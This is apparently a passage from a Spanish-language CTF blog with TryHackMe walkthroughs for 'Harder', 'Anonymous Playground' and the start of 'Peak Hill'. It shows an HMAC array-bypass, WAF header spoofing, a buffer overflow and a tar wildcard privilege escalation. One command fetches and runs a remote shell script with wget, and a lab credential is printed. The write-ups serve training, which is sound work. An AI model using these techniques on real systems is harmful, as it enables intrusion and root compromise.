$this-\u0026gt;prompt(); } //if clearing the login elseif(isset($_GET[\u0026#39;action\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;action\u0026#39;] == \u0026#34;clear_login\u0026#34;){ session_unset(); session_destroy(); //destroy any existing cookie by setting time in past if(!empty($_COOKIE[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;])) setcookie($this-\u0026gt;prefix.\u0026#34;user\u0026#34;, \u0026#34;blanked\u0026#34;, time()-(3600*25)); if(!empty($_COOKIE[$this-\u0026gt;prefix.\u0026#39;pass\u0026#39;])) setcookie($this-\u0026gt;prefix.\u0026#34;pass\u0026#34;, \u0026#34;blanked\u0026#34;, time()-(3600*25)); $msg = \u0026#39;\u0026lt;span class=\u0026#34;green\u0026#34;\u0026gt;\u0026#39;.LOGOUT_COMPLETE.\u0026#39;\u0026lt;/span\u0026gt;\u0026#39;; $this-\u0026gt;prompt($msg); } //prompt for elseif(!isset($_SESSION[$this-\u0026gt;prefix.\u0026#39;pass\u0026#39;]) || !isset($_SESSION[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;])){ $this-\u0026gt;prompt(); } //check the pw else{ $this-\u0026gt;user = $_SESSION[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;]; $this-\u0026gt;pass = $_SESSION[$this-\u0026gt;prefix.\u0026#39;pass\u0026#39;]; $this-\u0026gt;check();//dies if incorrect } } function check(){ if(md5($this-\u0026gt;prefix . LOGIN_PASS) != $this-\u0026gt;pass || LOGIN_USER != $this-\u0026gt;user){ //destroy any existing cookie by setting time in past if(!empty($_COOKIE[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;])) setcookie($this-\u0026gt;prefix.\u0026#34;user\u0026#34;, \u0026#34;blanked\u0026#34;, time()-(3600*25)); if(!empty($_COOKIE[$this-\u0026gt;prefix.\u0026#39;pass\u0026#39;])) setcookie($this-\u0026gt;prefix.\u0026#34;pass\u0026#34;, \u0026#34;blanked\u0026#34;, time()-(3600*25)); session_unset(); session_destroy(); $msg=\u0026#39;\u0026lt;span class=\u0026#34;red\u0026#34;\u0026gt;\u0026#39;.INCORRECT_USERNAME_PASSWORD.\u0026#39;\u0026lt;/span\u0026gt;\u0026#39;; $this-\u0026gt;prompt($msg); } } function prompt($msg=\u0026#39;\u0026#39;){ ?\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;\u0026lt;?php echo STARTER_GREETING; ?\u0026gt;\u0026lt;/title\u0026gt;\t\u0026lt;style\u0026gt; [... REDACTED ...] \u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;wrapper\u0026#34;\u0026gt;\u0026lt;div class=\u0026#34;highlight\u0026#34;\u0026gt;\u0026lt;div class=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;form class=\u0026#34;pure-form pure-form-stacked\u0026#34; action=\u0026#34;\u0026lt;?php echo $_SERVER[\u0026#39;SCRIPT_NAME\u0026#39;]; ?\u0026gt;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;fieldset\u0026gt; \u0026lt;legend\u0026gt;\u0026lt;?php if ($msg !== \u0026#39;\u0026#39;) { echo $msg; } else { echo STARTER_GREETING; } ?\u0026gt;\u0026lt;/legend\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;action\u0026#34; value=\u0026#34;set_login\u0026#34;\u0026gt; \u0026lt;!-- \u0026lt;label for=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;strong\u0026gt;\u0026lt;?php echo USERNAME; ?\u0026gt;:\u0026lt;/strong\u0026gt;\u0026lt;/label\u0026gt; --\u0026gt; \u0026lt;input id=\u0026#34;username\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;user\u0026#34; placeholder=\u0026#34;\u0026lt;?php echo ENTER_USERNAME; ?\u0026gt;\u0026#34; class=\u0026#34;pure-input-1\u0026#34;\u0026gt; \u0026lt;!-- \u0026lt;label for=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;strong\u0026gt;\u0026lt;?php echo PASSWORD; ?\u0026gt;:\u0026lt;/strong\u0026gt;\u0026lt;/label\u0026gt; --\u0026gt; \u0026lt;input id=\u0026#34;password\u0026#34; type=\u0026#34;password\u0026#34; name=\u0026#34;pass\u0026#34; placeholder=\u0026#34;\u0026lt;?php echo ENTER_PASSWORD; ?\u0026gt;\u0026#34; class=\u0026#34;pure-input-1\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;remember\u0026#34; class=\u0026#34;pure-checkbox\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;remember\u0026#34; name=\u0026#34;remember\u0026#34; type=\u0026#34;checkbox\u0026#34;\u0026gt; \u0026lt;?php echo REMEMBER_THIS_COMPUTER; ?\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;pure-button pure-button-primary\u0026#34;\u0026gt;\u0026lt;?php echo BUTTON_LOGIN; ?\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; \u0026lt;?php exit;}} ?\u0026gt; Finalmente tenemos el archivo hmac.php, segun el codigo, este requiere de los parametros h, host y n, tambien utiliza el archivo secret.php para obtener la variable $secret que es utilizada para crear un hash sha256 con el parametro n y en la variable $hm.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php if (empty($_GET[\u0026#39;h\u0026#39;]) || empty($_GET[\u0026#39;host\u0026#39;])) { header(\u0026#39;HTTP/1.0 400 Bad Request\u0026#39;); print(\u0026#34;missing get parameter\u0026#34;); die(); } require(\u0026#34;secret.php\u0026#34;); //set $secret var if (isset($_GET[\u0026#39;n\u0026#39;])) { $secret = hash_hmac(\u0026#39;sha256\u0026#39;, $_GET[\u0026#39;n\u0026#39;], $secret); } $hm = hash_hmac(\u0026#39;sha256\u0026#39;, $_GET[\u0026#39;host\u0026#39;], $secret); if ($hm !== $_GET[\u0026#39;h\u0026#39;]){ header(\u0026#39;HTTP/1.0 403 Forbidden\u0026#39;); print(\u0026#34;extra security check failed\u0026#34;); die(); } ?\u0026gt; La solicitudo a la url quedaria de la siguiente forma /index.php?n=param1\u0026amp;h=hashdeHOST\u0026amp;host=HOST si deseamos obtener el contenido de index.php. Para ver el contenido necesitamos la variable $secret pero no tenemos acceso a dicha variable para crear el hash de $secret y $m. Necesitamos de alguna forma saltarnos $secret = hash_hmac('sha256', $_GET['n'], $secret); para que el parametro host (hash) sea el mismo que h (texto).\nSegun la documentacion de hash_hmac() se puede saltar esta funcion pasandole un array solo aparecería un error y la aplicacion continuaria ejecutandose. En el caso de $secret el valor de este se volveria NULL. Este se volveria False en $hm = hash_hmac('sha256', $_GET['host'], False /*$secret*/ ); por lo que podriamos crear un hash y pasarlo en h. Para pasar un array por una URL se puede realizar de la siguiente forma ?param[]=1\u0026amp;param[]=2.\nCreamos un hash con $hm = hash_hmac('sha256', 'sckull.io', False); utilizando PHP, segun lo anterior, nuestros parametros quedarian de la siguiente forma: n[]=1\u0026amp;h=33e89644bd7110e227fcddfa7a12b8a1c250e508b3f201532014a8ff63b67d5d\u0026amp;host=sckull.io. Al pasarlos al index nos muestra una tabla, donde vemos un subdominio y unas credenciales.\nHTTP HEADERS Visitamos el nuevo subdominio y nos muestra nuevamente el panel de pwd.\nIngresamos con las credenciales y nos muestra un mensaje en el que pide que la direccion IP esta permitida 10.10.10.X.\n1 Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos en el nuevo dominio, pero no encontramos algo interesante.\n1 2 3 4 5 6 kali@kali:~/tools/GitTools/Extractor$ gobuster dir -u http://shell.harder.local/ -w $LIST/dirb/common.txt -q -t 250 -x php,html,txt /auth.php (Status: 200) /index.php (Status: 200) /index.php (Status: 200) /ip.php (Status: 200) /vendor (Status: 301) Encontramos WAF BYPASS - OWASP (pag 16) en donde vemos como se puede realizar bypass a ciertas IPS que estan configuradas en el WAF, con los HEADER:\nX-Originating-IP\rX-Forwarded-For\rX-Remote-IP\rX-Remote-Addr Utilizamos esos HEADERS con una direccion IP (10.10.10.10) permitida y logramos encontrar que uno de estos funciona y logramos ver una pagina diferente.\nUSER - WWW En esta pagina encontramos una webshell en la cual podemos ejecutar comandos.\nEjecutamos una shell inversa y logramos obtener una shell con el usuario www.\nLogramos obtener nuestra flag user.txt.\nUSER - EVS Encontramos un archivo el cual contiene la contraseña del usuario evs el cual utilizamos para obtener una shell en el servicio SSH.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion de archivos SUID y encontramos el archivo /usr/local/bin/execute-crypted, al ver las strings de este archivo vemos un archivo sh.\nUtilizamos Ghidra y vemos el codigo del archivo el cual ejecuta /usr/local/bin/run-crypted.sh con el parametro que le pasemos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 undefined8 main(int param_1,long param_2) { long in_FS_OFFSET; char *local_18; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); setuid(0); if (param_1 == 2) { asprintf(\u0026amp;local_18,\u0026#34;/usr/local/bin/run-crypted.sh %s\u0026#34;,*(undefined8 *)(param_2 + 8)); system(local_18); free(local_18); } else { system(\u0026#34;/usr/local/bin/run-crypted.sh\u0026#34;); } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; } El archivo run-crypted.sh ejecuta gpg junto con algunos parametros y el parametro que le se le pasa a execute-crypted.\n1 2 3 4 5 6 7 8 9 10 11 12 13 #!/bin/sh if [ $# -eq 0 ] then echo -n \u0026#34;[*] Current User: \u0026#34;; whoami; echo \u0026#34;[-] This program runs only commands which are encypted for root@harder.local using gpg.\u0026#34; echo \u0026#34;[-] Create a file like this: echo -n whoami \u0026gt; command\u0026#34; echo \u0026#34;[-] Encrypt the file and run the command: execute-crypted command.gpg\u0026#34; else export GNUPGHOME=/root/.gnupg/ gpg --decrypt --no-verbose \u0026#34;$1\u0026#34; | ash fi En este caso necesitamos la llave (.pub) para poder ejecutar comandos. Realizamos una busqueda de estos archivos (.pub) y logramos encontrar uno que podria ayudarmos.\nCreamos el archivo que contiene el comando whoami, con este archivo creamos una llave, lo ejecutamos y logramos ver que se ejecuta nuestro comando como root.\nEjecutamos un nuevo comando para cambiarle los permisos al contenido de la carpeta /root/*, logramos obtener la flag root.txt.\nSERVER FILES Vemos los archivos que no logramos ver en el repositorio.\n1 2 3 \u0026lt;?php $creds = array(\u0026#34;http://shell.harder.local\u0026#34;, \u0026#34;evs\u0026#34;, \u0026#34;9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm\u0026#34;); ?\u0026gt; 1 2 3 4 5 \u0026lt;?php $secret = \u0026#34;68b329da98[... REDACTED ...]b9c940\u0026#34;; ?\u0026gt; ","description":"Harder es una maquina de TryHackMe, utilizamos GitTools para obtener el codigo fuente de la pagina lo cual nos dio credenciales para acceder al portal el cual realizamos Bypass al WAF con ello obtuvimos acceso a la maquina para luego cambiar al siguiente usuario en contraseñas almacenadas. Escalamos privilegios utilizando gpg y un binario con permisos SUID.","id":103,"section":"posts","tags":["gittools","suid"],"title":"TryHackMe - Harder","uri":"https://sckull.github.io/posts/harder/"},{"content":"\rAnonymous Playground es una maquina de TryHackMe, inicialmente presenta un reto que mediante un script obtuvimos las credenciales para acceder al servicio SSH. Realizamos una pequeña explotacion de un archivo suid para realizar movimiento lateral. Finalmente utilizamos wildcards con tar para escalar privilegios.\nRoom Titulo Anonymous Playground Descripción Want to become part of Anonymous? They have a challenge for you. Can you get the flags and become an operative? Puntos 190 Dificultad Dificil Maker Nameless0ne NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 # Nmap 7.80 scan initiated Mon Aug 17 16:53:27 2020 as: nmap -Pn -sV -o mini_scan anonymous.thm Nmap scan report for anonymous.thm (10.10.168.121) Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Aug 17 16:54:24 2020 -- 1 IP address (1 host up) scanned in 57.27 seconds HTTP Encontramos una pagina web en el puerto 80.\nEn la pagina Operatives se muestra una lista de posibles usuarios.\nEn el codigo fuente de la imagen encontramos un comentario en el cual vemos una direccion de una pagina, dicha pagina no existe.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 kali@kali:~/thm/anonymousplayground$ gobuster dir -u http://anonymous.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 250 -q -x php,html,txt /index.php (Status: 200) /images (Status: 301) /js (Status: 301) /robots.txt (Status: 200) En robots.txt encontramos una direccion que al visitarla nos muestra un mensaje.\nEn esta ultima pagina encontramos un cookie el cual está configurado en denied.\nLe cambiamos el valor a granted utilizando firefox.\nRecargamos la pagina y ahora nos muestra el siguiente mensaje, al parecer es un mensaje codificado.\nMAGNA - USER Intenamos con los diferentes bases y ciphers pero no logramos obtener ningun valor interesante, en la plataforma nos da una pista donde el valor zA es a:\n1 You\u0026#39;re going to want to write a Python script for this. \u0026#39;zA\u0026#39; = \u0026#39;a\u0026#39; Podemos ver que zA = a eso quiere decir que cada par de letras tiene un valor, de tal forma que quedaria de la siguiente forma si reemplazamos zA, pero solo tenemos el valor de a.\n1 2 - hE zA dC fH zA::hE zA dC fH zA hA iJ zA eI aD jB cB hH gA zA fH fN + hE a dC fH a ::hE a dC fH a hA iJ a eI aD jB cB hH gA a fH fN La cantidad de caracteres al decodificarlo quedaria de la siguiente forma 5::17. Los usuarios que encontramos ninguno de ellos tiene más de 17 caracteres pero si encontramos cuatro de ellos que tienen 5 caracteres (['ninja', 'jammy', 'magna', 'skidy']) por lo que quizas la primera parte de la codificacion tenga uno de los usuarios y posiblemente la segunda, una contraseña.\nEn la primera parte tenemos 5 caracteres para un \u0026ldquo;usuario\u0026rdquo;, segun la pista la primera parte tiene dos a y entre los usuarios solo magna tiene la misma letra en la misma posision, por lo que el valor hE posiblemente pertenezca a m y asi con los valores siguientes.\n1 2 3 - hE zA dC fH zA + hE a dC fH a + m a g n a Escribimos un pequeño script el cual utiliza un numero (n) para poder encontrar la letra m (con chr()), utilizando los valores unicode del par de letras (con ord()), sumando el valor de cada uno de ellos y restando o sumando el numero (n).\n1 2 3 4 5 6 \u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;h\u0026#39;) 104 \u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;E\u0026#39;) 69 #Valor Esperado con la \u0026#34;formula\u0026#34; chr(104 + 69 +/- n) = \u0026#34;m\u0026#34; Hay que tomar en cuenta que el valor zA es a:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #\u0026#34;Credentials\u0026#34; encoded_cred = \u0026#34;hE zA dC fH zA\u0026#34;.split(\u0026#39; \u0026#39;) #USERS users = open(\u0026#39;users.txt\u0026#39;,\u0026#39;r\u0026#39;) users = [x.rstrip() for x in users] users = [x for x in users if len(x) == 5] def decode(num, lista): tmp = \u0026#34;\u0026#34; for i in lista: if i == \u0026#34;zA\u0026#34;: tmp = tmp + \u0026#34;a\u0026#34; else: tmp = tmp + str(chr( ord(i[0]) + ord(i[1]) - num)) return(tmp) for i in range(0, 256): value = ord(\u0026#39;h\u0026#39;) + ord(\u0026#39;E\u0026#39;) - i\tif value in range(90,123): if chr(value) == \u0026#34;m\u0026#34;: print(\u0026#34;Posible numero: \u0026#34; + str(i)) print(decode(i, encoded_cred)) Al ejecutar el script nos devuelve el numero que se puede utilizar para encontrar el valor de m el cual utilizamos para decodificar la primera parte, y el resultado fue magna.\n1 2 3 kali@kali:~/thm/anonymousplayground$ python creds.py Posible numero: 64 magna Realizamos lo mismo pero ahora con la segunda parte:\n1 2 3 encoded_cred_two = \u0026#34;hE zA dC fH zA hA iJ zA eI aD jB cB hH gA zA fH fN\u0026#34;.split(\u0026#39; \u0026#39;) encoded_cred = \u0026#34;hE zA dC fH zA\u0026#34;.split(\u0026#39; \u0026#39;) print(decode(64, encoded_cred) + \u0026#34;::\u0026#34; + decode(64, encoded_cred_two)) Utilizamos estas \u0026ldquo;credenciales\u0026rdquo; en el servicio SSH y logramos obtener una shell y nuestra primera flag.txt.\nUSER - SPOOKY En la carpeta principal encontramos una nota en el cual indica que Spooky hizo un binario en C y que en la maquina esta installado radare2 y gdb para poder realizarle un reversing:\n1 2 3 4 5 6 7 8 9 Hey Magna, Check out this binary I made! I\u0026#39;ve been practicing my skills in C so that I can get better at Reverse Engineering and Malware Development. I think this is a really good start. See if you can break it! P.S. I\u0026#39;ve had the admins install radare2 and gdb so you can debug and reverse it right here! Best, Spooky El binario se encuentra en la carpeta principal.\nUtilizamos radare2, vemos varias funciones interesantes como sym.main y sym.call_bash.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 [0x00400570]\u0026gt; afl 0x00400000 3 72 -\u0026gt; 73 sym.imp.__libc_start_main 0x004004e0 3 23 sym._init 0x00400510 1 6 sym.imp.puts 0x00400520 1 6 sym.imp.system 0x00400530 1 6 sym.imp.printf 0x00400540 1 6 sym.imp.gets 0x00400550 1 6 sym.imp.setuid 0x00400560 1 6 sym.imp.sleep 0x00400570 1 43 entry0 0x004005a0 1 2 sym._dl_relocate_static_pie 0x004005b0 3 35 sym.deregister_tm_clones 0x004005e0 3 53 sym.register_tm_clones 0x00400620 3 34 -\u0026gt; 29 sym.__do_global_dtors_aux 0x00400650 1 7 entry1.init 0x00400657 1 129 sym.call_bash 0x004006d8 1 56 sym.main 0x00400710 4 101 sym.__libc_csu_init 0x00400780 1 2 sym.__libc_csu_fini 0x00400784 1 9 sym._fini [0x00400570]\u0026gt; En sym.main vemos que simplemente realiza una impresion y pregunta por algo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 [0x00400570]\u0026gt; pdf @sym.main ;-- main: / (fcn) sym.main 56 | sym.main (); | ; var int local_50h @ rbp-0x50 | ; var int local_44h @ rbp-0x44 | ; var int local_40h @ rbp-0x40 | ; DATA XREF from 0x0040058d (entry0) | 0x004006d8 55 push rbp | 0x004006d9 4889e5 mov rbp, rsp | 0x004006dc 4883ec50 sub rsp, 0x50 ; \u0026#39;P\u0026#39; | 0x004006e0 897dbc mov dword [local_44h], edi | 0x004006e3 488975b0 mov qword [local_50h], rsi | 0x004006e7 488d3d1d0100. lea rdi, qword str.Who_do_you_want_to_hack ; 0x40080b ; \u0026#34;Who do you want to hack? \u0026#34; | 0x004006ee b800000000 mov eax, 0 | 0x004006f3 e838feffff call sym.imp.printf ; int printf(const char *format) | 0x004006f8 488d45c0 lea rax, qword [local_40h] | 0x004006fc 4889c7 mov rdi, rax | 0x004006ff b800000000 mov eax, 0 | 0x00400704 e837feffff call sym.imp.gets ; char*gets(char *s) | 0x00400709 b800000000 mov eax, 0 | 0x0040070e c9 leave \\ 0x0040070f c3 ret En sym.call_bash vemos que realiza varias impresiones y al final ejecuta /bin/sh.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 [0x00400570]\u0026gt; pdf @sym.call_bash / (fcn) sym.call_bash 129 | sym.call_bash (); | 0x00400657 55 push rbp | 0x00400658 4889e5 mov rbp, rsp | 0x0040065b 488d3d360100. lea rdi, qword str.We_are_Anonymous. ; 0x400798 ; \u0026#34;\\nWe are Anonymous.\u0026#34; | 0x00400662 e8a9feffff call sym.imp.puts ; int puts(const char *s) | 0x00400667 bf01000000 mov edi, 1 | 0x0040066c e8effeffff call sym.imp.sleep ; int sleep(int s) | 0x00400671 488d3d330100. lea rdi, qword str.We_are_Legion. ; 0x4007ab ; \u0026#34;We are Legion.\u0026#34; | 0x00400678 e893feffff call sym.imp.puts ; int puts(const char *s) | 0x0040067d bf01000000 mov edi, 1 | 0x00400682 e8d9feffff call sym.imp.sleep ; int sleep(int s) | 0x00400687 488d3d2c0100. lea rdi, qword str.We_do_not_forgive. ; 0x4007ba ; \u0026#34;We do not forgive.\u0026#34; | 0x0040068e e87dfeffff call sym.imp.puts ; int puts(const char *s) | 0x00400693 bf01000000 mov edi, 1 | 0x00400698 e8c3feffff call sym.imp.sleep ; int sleep(int s) | 0x0040069d 488d3d290100. lea rdi, qword str.We_do_not_forget. ; 0x4007cd ; \u0026#34;We do not forget.\u0026#34; | 0x004006a4 e867feffff call sym.imp.puts ; int puts(const char *s) | 0x004006a9 bf01000000 mov edi, 1 | 0x004006ae e8adfeffff call sym.imp.sleep ; int sleep(int s) | 0x004006b3 488d3d260100. lea rdi, qword str.Message_corrupted_...Well...done. ; 0x4007e0 ; \u0026#34;[Message corrupted]...Well...done.\u0026#34; | 0x004006ba e851feffff call sym.imp.puts ; int puts(const char *s) | 0x004006bf bf39050000 mov edi, 0x539 ; 1337 | 0x004006c4 e887feffff call sym.imp.setuid | 0x004006c9 488d3d330100. lea rdi, qword str.bin_sh ; 0x400803 ; \u0026#34;/bin/sh\u0026#34; | 0x004006d0 e84bfeffff call sym.imp.system ; int system(const char *string) | 0x004006d5 90 nop | 0x004006d6 5d pop rbp \\ 0x004006d7 c3 ret [0x00400570]\u0026gt; Para entenderlo con más claridad utilizamos Ghidra y vemos el codigo fuente de ambas funciones, en main vemos que el valor de la variable local_48 tiene un tamaño de 64 y la segunda funcion simplemente realiza impresiones y una ejecucion:\n1 2 3 4 5 6 7 8 9 undefined8 main(void) { char local_48 [64]; printf(\u0026#34;Who do you want to hack? \u0026#34;); gets(local_48); return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 void call_bash(void) { puts(\u0026#34;\\nWe are Anonymous.\u0026#34;); sleep(1); puts(\u0026#34;We are Legion.\u0026#34;); sleep(1); puts(\u0026#34;We do not forgive.\u0026#34;); sleep(1); puts(\u0026#34;We do not forget.\u0026#34;); sleep(1); puts(\u0026#34;[Message corrupted]...Well...done.\u0026#34;); setuid(0x539); //1337 system(\u0026#34;/bin/sh\u0026#34;); return; } Realizando la ejecucion del binario logramos obtener el mensaje Segmentation fault y el offset. Sabiendo el offset vamos a poder realizar la llamada a la funcion call_bash.\nLogramos obtener una shell con el usuario Spooky.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion en el archivo /etc/crontab y encontramos que existe un cron que es ejecutado por el usuario root el cual realiza un backup de todo lo que se encuentre en /home/spooky.\nUtilizamos los \u0026ldquo;parametros\u0026rdquo; para explotar esta vulnerabilidad creando un archivo que contenga nuestra shell inversa, y creamos los \u0026ldquo;parametros\u0026rdquo; los cuales van a ejecutar nuestra shell al igual que en la maquina CMESS - THM.\n1 2 3 echo \u0026#39;bash -c \u0026#34;$(wget -qO- http://10.2.29.162/shell.sh)\u0026#34; \u0026#39; \u0026gt; shell.sh echo \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=sh shell.sh\u0026#34; echo \u0026#34;\u0026#34; \u0026gt; --checkpoint=1 Creamos nuestra shell en nuestra maquina, ponemos a la escucha netcat y logramos obtener nuestra shell con usuario root y nuestra flag root.txt.\n","description":"Anonymous Playground es una maquina de TryHackMe, inicialmente presenta un reto que mediante un script obtuvimos las credenciales para acceder al servicio SSH. Realizamos una pequeña explotacion de un archivo suid para realizar movimiento lateral. Finalmente utilizamos wildcards con tar para escalar privilegios.","id":104,"section":"posts","tags":["wildcard privesc"],"title":"TryHackMe - Anonymous Playground","uri":"https://sckull.github.io/posts/anonymousplayground/"},{"content":"\rPeak Hill es una maquina de TryHackMe, encontramos un fichero dentro del cual descubrimos credenciales las cuales estaban como un objeto, utilizamos Python para extraerlas y acceder por SSH. Decompilamos un archivo de Python y obtuvimos credenciales utilizando la libreria de Crypto lo que nos dio acceso al siguiente usuario. Finalmente encontramos un binario en el cual enviamos un objeto creado con Python y la libreria cPickle para ejecutar bash y obtener una shell como root.\nRoom Titulo Peak Hill Descripción Exercises in Python library abuse and some exploitation techniques Puntos 210 Dificultad Media Maker JohnHammond NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21, 20) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 # Nmap 7.80 scan initiated Sun Aug 16 20:09:24 2020 as: nmap -Pn -sV -o mini_scan peakhill.thm Nmap scan report for peakhill.thm (10.10.29.120) Host is up (0.30s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 20/tcp closed ftp-data 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Aug 16 20:09:46 2020 -- 1 IP address (1 host up) scanned in 22.07 seconds FTP Ingresamos con las credenciales de anonymous (anonymous:anonymous) en donde encontramos dos archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 kali@kali:~/thm/peakhill$ ftp peakhill.thm Connected to peakhill.thm. 220 (vsFTPd 3.0.3) Name (peakhill.thm:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 May 15 18:37 . drwxr-xr-x 2 ftp ftp 4096 May 15 18:37 .. -rw-r--r-- 1 ftp ftp 7048 May 15 18:37 .creds -rw-r--r-- 1 ftp ftp 17 May 15 18:37 test.txt 226 Directory send OK. ftp\u0026gt; get .creds local: .creds remote: .creds 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for .creds (7048 bytes). 226 Transfer complete. 7048 bytes received in 0.00 secs (35.1911 MB/s) ftp\u0026gt; get test.txt local: test.txt remote: test.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for test.txt (17 bytes). 226 Transfer complete. 17 bytes received in 0.00 secs (129.6997 kB/s) ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; bye 221 Goodbye. PICKLE - .CREDS En el servicio FTP encontramos dos archivos uno de ellos solo era un archivo de prueba, el otro tenia un mensaje en binario, utilizamos CyberCheff para ver el mensaje. En el mensaje vemos strings relacionados con SSH, intentamos decodificar con otros tipos de codificaciones y cifrado pero no logramos obtener nada.\nEn la descripcion de la maquina encontramos que la maquina incluye ejercicios de Python además de eso encontramos dos veces la imagen de un pepinillo que puede hacer referencia a la libreria de Pickle. Descargamos el archivo decodificado y utilizando Python logramos obtener el contenido, donde vemos tuplas con valores de ssh_user y ssh_pass.\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; import pickle \u0026gt;\u0026gt;\u0026gt; picklefile = open(\u0026#39;possible_pickle\u0026#39;, \u0026#39;rb\u0026#39;) \u0026gt;\u0026gt;\u0026gt; print(pickle.load(picklefile)) [(\u0026#39;ssh_pass15\u0026#39;, \u0026#39;u\u0026#39;), (\u0026#39;ssh_user1\u0026#39;, \u0026#39;h\u0026#39;), (\u0026#39;ssh_user0\u0026#39;, \u0026#39;g\u0026#39;), (\u0026#39;ssh_pass1\u0026#39;, \u0026#39;1\u0026#39;), [... REDACTED ...], (\u0026#39;ssh_pass10\u0026#39;, \u0026#39;1\u0026#39;)] \u0026gt;\u0026gt;\u0026gt; Utilizamos un script para poder ordenar los datos segun el numero, basta con imprimir los diccionarios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import pickle from collections import OrderedDict def sortByKey(dictionary): return(dict(sorted(dictionary.items()))) picklefile = open(\u0026#39;possible_pickle\u0026#39;, \u0026#39;rb\u0026#39;) a = pickle.load(picklefile) ssh_pass = dict() ssh_user = dict() for i in range(len(a)): if \u0026#34;ssh_pass\u0026#34; in a[i][0]: ssh_pass[a[i][0]] = a[i][1] elif \u0026#34;ssh_user\u0026#34; in a[i][0]: ssh_user[a[i][0]] = a[i][1] else: print(\u0026#34;None\u0026#34;) print(sortByKey(ssh_user)) print(sortByKey(ssh_pass)) GHERKIN - USER Utilizamos las credenciales que obtuvimos, en el servicio ssh y logramos obtener una shell.\nDILL - USER En el directorio principal del usuario encontramos un archivo .pyc el cual trasladamos a nuestra maquina para obtener el codigo fuente utilizando uncompyle6.\nEl codigo fuente o script real nos muestra que es un servidor con su puerto y una funcion en donde se pueden ejecutar comandos, pero es necesario ingresar credenciales, tambien vemos las credenciales las cuales estan \u0026ldquo;convertidas a numeros\u0026rdquo;.\n1 2 username = long_to_bytes(16[... REDACTED ...]36) password = long_to_bytes(2457[... REDACTED ...]2356) Revisamos si este script se estaba ejecutando en la maquina y vemos en proceso el script el cual lo ejecuta Dill.\nUtilizamos las misma libreria (Crypto.Util.number) para obtener las credenciales reales.\n1 2 3 4 5 6 7 8 \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.number import bytes_to_long, long_to_bytes \u0026gt;\u0026gt;\u0026gt; username = 